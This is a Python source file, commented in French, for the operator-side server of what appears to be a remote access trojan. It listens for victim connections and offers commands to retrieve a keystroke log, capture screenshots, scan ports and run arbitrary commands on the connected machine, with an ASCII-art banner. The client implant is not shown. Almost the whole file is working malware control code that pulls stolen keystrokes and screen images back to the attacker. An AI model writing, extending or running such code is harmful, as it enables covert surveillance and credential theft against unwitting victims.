import socket
import threading
import time

ip_address = '0.0.0.0'
port_number = 1234
keylog_file = "keylog.txt"

def afficher_ascii_art(filepath):
    """
    Lit et affiche un fichier contenant de l'ASCII art avec coloration spécifique pour les caractères +, -, ., :, =, *, et @.
    L'affichage se fait progressivement ligne par ligne.
    :param filepath: Chemin du fichier contenant l'art ASCII.
    """
    try:
        with open(filepath, "r", encoding="utf-8") as file:
            print("\n" + "=" * 80)
            for line in file:
                middle_index = len(line) // 2
                left_part = (line[:middle_index]
                             .replace('+', '\033[31m+\033[0m')
                             .replace('-', '\033[31m-\033[0m')
                             .replace('.', '\033[31m.\033[0m')
                             .replace(':', '\033[31m:\033[0m')
                             .replace('=', '\033[31m=\033[0m')
                             .replace('*', '\033[31m*\033[0m')
                             .replace('@', '\033[30m@\033[0m'))
                right_part = (line[middle_index:]
                              .replace('+', '\033[35m+\033[0m')
                              .replace('-', '\033[35m-\033[0m')
                              .replace('.', '\033[35m.\033[0m')
                              .replace(':', '\033[35m:\033[0m')
                              .replace('=', '\033[35m=\033[0m')
                              .replace('*', '\033[35m*\033[0m')
                              .replace('@', '\033[30m@\033[0m'))
                print(left_part + right_part, end='', flush=True)
                time.sleep(0.1)  # Délai rapide entre les lignes
            print("\n" + "=" * 80)
    except FileNotFoundError:
        print(f"Erreur : Le fichier {filepath} est introuvable.")
    except Exception as e:
        print(f"Erreur lors de la lecture de l'art ASCII : {e}")

def handle_connection(connection, address):
    afficher_ascii_art("dracaufeu.txt")
    print(f"Connexion établie avec {address}")

    help_text = """
        Commandes disponibles:
        - exit : Ferme la connexion avec le client.
        - keylog : Récupère le fichier keylog.txt depuis le client, l'affiche dans la console et le sauvegarde.
        - screenshot : Prend une capture d'écran du client et l'enregistre sous le nom 'screen.png'.
        - scan <start_port> <end_port> : Effectue un scan des ports dans la plage spécifiée.
        - pop_ascii : Régénère et affiche l'ASCII art.
        - help : Affiche cette aide.
        """

    while True:
        try:
            command = input("Entrer 'help' pour afficher les commandes disponibles ou 'exit' pour quitter : ")

            if command.lower() == 'exit':
                connection.send(b'quit')
                break

            elif command.lower() == 'help':
                print(help_text)
                continue

            elif command.lower() == 'keylog':
                try:
                    connection.send(command.encode())  # Envoie la commande au client

                    # Recevoir la taille du fichier keylog.txt
                    file_size = int(connection.recv(1024).decode())
                    connection.send(b'OK')  # Accusé de réception

                    # Recevoir le contenu du fichier
                    keylog_data = b""
                    while len(keylog_data) < file_size:
                        packet = connection.recv(4096)
                        if not packet:
                            break
                        keylog_data += packet

                    # Sauvegarder le fichier sur le serveur
                    with open(keylog_file, "wb") as f:
                        f.write(keylog_data)

                    print(f"Le fichier keylog.txt a été sauvegardé dans le répertoire du serveur. Contenu :\n")
                    print(keylog_data.decode())
                except Exception as e:
                    print(f"Erreur lors de la réception du fichier keylog : {e}")

            elif command.lower() == 'screenshot':
                connection.send(command.encode())
                img_size = int(connection.recv(1024).decode())
                connection.send(b'OK')
                img_data = b''
                while len(img_data) < img_size:
                    packet = connection.recv(4096)
                    if not packet:
                        break
                    img_data += packet

                with open("screen.png", "wb") as f:
                    f.write(img_data)
                print("Capture réussie !")
                continue

            elif command.startswith("scan"):
                print("Scan en cours...")
                response = connection.recv(4096).decode()
                print(f"Résultat du scan :\n{response}")
                continue

            elif command.lower() == 'pop_ascii':
                afficher_ascii_art("dracaufeu.txt")
                continue

            else:
                connection.send(command.encode())
                response = connection.recv(4096).decode()
                if not response:
                    break

                print(f"Output:\n{response}")
        except Exception as e:
            print(f"Error: {e}")
            break

    connection.close()

def start_server():
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.bind((ip_address, port_number))
    ss.listen(5)
    print(f"Serveur en écoute sur {ip_address}:{port_number}")

    while True:
        connection, address = ss.accept()
        thread = threading.Thread(target=handle_connection, args=(connection, address))
        thread.start()

if __name__ == "__main__":
    start_server()
